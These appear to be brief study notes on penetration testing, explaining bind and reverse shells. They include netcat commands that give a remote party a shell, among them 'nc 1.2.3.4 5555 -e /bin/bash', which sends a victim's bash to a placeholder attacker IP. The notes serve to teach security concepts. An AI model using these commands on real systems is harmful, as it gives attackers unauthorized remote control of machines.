-> VAPT = Vulnerability Assessment and Penetration Testing

-> If you find that you can run commands somewhere
-> Bind shell -> victim = listener
-> Reverse Shell -> victim = initiator

Bind shell:
-> initiator - I wanna connect = attacker
  nc 5.6.7.8(ip) 44410(port)

-> listener = victim - I want someone to connect to me - runs on a particular port
  nc -lvp(listen, verbosity,port) 44410(port) -e(execute a specific command) /bin/bash
  
Issue with bind shell
-> firewall - whitelists packets amd drops your malicious packet
-> nat(network address translation) and pat(port address translation)

Reverse Shell
-> making the victim connect to us
-

-> listener -> attacker
  nc -lvp 5555 -> come and connect to this port
 
 -> initiator -> victim
  nc 1.2.3.4 5555 -e /bin/bash -> connect to this IP at this port and run bash, run commands from listener and present commands on attacker
